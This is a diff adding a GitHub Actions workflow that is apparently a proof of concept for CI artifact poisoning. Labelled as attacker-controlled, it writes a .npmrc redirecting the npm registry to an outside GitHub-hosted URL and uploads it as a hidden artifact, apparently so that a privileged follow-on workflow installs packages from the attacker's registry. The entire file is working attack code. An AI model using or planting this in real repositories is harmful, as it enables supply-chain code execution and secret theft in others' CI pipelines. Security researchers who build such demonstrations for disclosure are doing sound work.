@@ -1,0 +1,25 @@
+name: Lint
+on:
+  pull_request:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build artifact contents chosen by the PR author
+        run: |
+          mkdir -p /tmp/root
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg5/\naudit=false\nfund=false\nprogress=false\n' > /tmp/root/.npmrc
+          echo "${{ github.event.pull_request.number }}" > /tmp/root/pr-number.txt
+          printf '### Attacker-chosen linter report\n\nThis body is fully controlled by the PR author.\n' > /tmp/root/linter-report.txt
+      - uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: |
+            /tmp/root/.npmrc
+            /tmp/root/pr-number.txt
+            /tmp/root/linter-report.txt
+          include-hidden-files: true
+          if-no-files-found: ignore
